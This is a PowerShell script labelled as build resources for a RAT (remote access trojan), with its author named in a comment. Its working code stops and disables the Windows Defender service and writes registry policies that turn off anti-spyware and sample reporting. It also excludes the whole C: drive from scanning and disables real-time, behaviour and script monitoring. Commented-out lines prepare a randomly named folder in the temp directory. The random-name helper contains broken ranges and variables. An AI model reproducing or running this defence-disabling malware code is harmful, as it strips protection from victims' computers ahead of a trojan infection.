# BUILD RESOURCES FOR RAT
# CRAETED BY : Mohid Mughal

# Random string creator to create names for files
function random_text {
    return -join((65..90) + (97..22) | Get-Random -Count 5 | % {[char]$__})
}

######################################################################################################################################
# Attempt to disable Windows Defender - Too low level programing for me to nderstand and is inspired by someones code
try {
    Get-Service WinDefend | Stop-Service -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -Value 4 -Type DWORD -Force
}
catch {
    Write-Warning "Failed to disable WinDefend service"
}

try {
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
      if (-Not ((Get-WmiObject -class Win32_OperatingSystem).Version -eq "6.1.7601")) {
          Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
          Set-MpPreference -DisableArchiveScanning $true  -ea 0 | Out-Null
          Set-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableCatchupFullScan $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableCatchupQuickScan $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableIntrusionPreventionSystem $true  -Force -ea 0 | Out-Null
          Set-MpPreference -DisableIOAVProtection $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableRestorePoint $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0 | Out-Null
          Set-MpPreference -DisableScriptScanning $true -Force -ea 0 | Out-Null
          Set-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 | Out-Null
          Set-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0 | Out-Null
          Set-MpPreference -MAPSReporting Disabled -Force -ea 0 | Out-Null
          Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null
          Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null
      }
}
catch {
    Write-Warning "Failed to disable Windows Defender"
}
######################################################################################################################################


#cd $env:temp    # moves to temp directory of windows
#$directory_name = random_text   # creates and store a string of random variabls which can be later given to a file as "name"
#mkdir $directory_name   # creates a file inside temp directory with the name stored in the adjacent variable (name will be a string of random characters)

